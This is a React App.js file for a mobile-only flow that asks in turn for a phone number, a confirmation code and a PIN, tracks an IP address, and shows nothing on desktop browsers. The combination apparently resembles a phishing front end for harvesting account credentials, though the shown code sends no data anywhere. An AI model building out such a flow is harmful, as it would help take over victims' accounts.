import Navbar from "./Components/NavBar/NavBar";
import Number from "./Components/Contents/Number";
import Confirm from "./Components/Contents/Confirm";
import Pin from "./Components/Contents/Pin";
import Footer from "./Components/Footer/Footer";
import { useState } from "react";
import { isMobile } from "react-device-detect";

export default function App() {
  const [ncode, setNcode] = useState({
    number: '',
    code: '',
    pin:'',
    ip:'',
  });
  const [page, setPage] = useState('p1');
  return (
    isMobile ?
    <div>
      <div>
        <Navbar />
        { page === 'p1' ?
        <Number setPage={setPage} setNcode={setNcode} ncode={ncode} />
        :(page === 'p2' ? 
          <Confirm setPage={setPage}  setNcode={setNcode} ncode={ncode} />
        : <Pin setNcode={setNcode} ncode={ncode}  />)
        }
        <Footer />
      </div>
    </div> : ""
  );
}